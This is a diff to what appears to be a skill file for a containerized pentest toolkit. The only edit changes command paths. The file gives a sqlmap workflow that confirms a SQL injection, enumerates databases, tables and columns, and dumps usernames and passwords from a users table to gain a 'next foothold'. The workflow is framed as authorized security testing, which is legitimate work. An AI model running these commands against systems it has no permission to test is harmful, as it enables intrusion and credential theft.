@@ -6,7 +6,7 @@ description: Automated SQL injection detection and exploitation with sqlmap, for
 # SQL injection with sqlmap
 
 Automated SQLi detection and exploitation against an authorized target, driven by
-`scripts/roo sqlmap` (sqlmap in a container). sqlmap confirms an injection point,
+`./roo sqlmap` (sqlmap in a container). sqlmap confirms an injection point,
 fingerprints the DBMS, and enumerates/dumps data — schema, tables, and the
 credentials that usually become the next foothold.
 
@@ -38,16 +38,16 @@ unauthenticated target). Run them in order — each reuses the cached injection.
 
 ```bash
 # 1. Confirm an injection point (focus one parameter)
-ROO_NET=container:roorecon-vpn scripts/roo sqlmap -u "<url>" --cookie "<c>" -p <param>
+ROO_NET=container:roorecon-vpn ./roo sqlmap -u "<url>" --cookie "<c>" -p <param>
 
 # 2. Enumerate: current DB/user → databases → a table's columns
-ROO_NET=container:roorecon-vpn scripts/roo sqlmap -u "<url>" --cookie "<c>" -p <param> --current-db --current-user
-ROO_NET=container:roorecon-vpn scripts/roo sqlmap -u "<url>" --cookie "<c>" -p <param> --dbs
-ROO_NET=container:roorecon-vpn scripts/roo sqlmap -u "<url>" --cookie "<c>" -p <param> -D <db> --tables
-ROO_NET=container:roorecon-vpn scripts/roo sqlmap -u "<url>" --cookie "<c>" -p <param> -D <db> -T <table> --columns
+ROO_NET=container:roorecon-vpn ./roo sqlmap -u "<url>" --cookie "<c>" -p <param> --current-db --current-user
+ROO_NET=container:roorecon-vpn ./roo sqlmap -u "<url>" --cookie "<c>" -p <param> --dbs
+ROO_NET=container:roorecon-vpn ./roo sqlmap -u "<url>" --cookie "<c>" -p <param> -D <db> --tables
+ROO_NET=container:roorecon-vpn ./roo sqlmap -u "<url>" --cookie "<c>" -p <param> -D <db> -T <table> --columns
 
 # 3. Dump — scope it tight (one table, the columns you need, one row if you can)
-ROO_NET=container:roorecon-vpn scripts/roo sqlmap -u "<url>" --cookie "<c>" -p <param> \
+ROO_NET=container:roorecon-vpn ./roo sqlmap -u "<url>" --cookie "<c>" -p <param> \
   -D <db> -T users -C username,password --where "username='<target-user>'" --dump
 ```
 
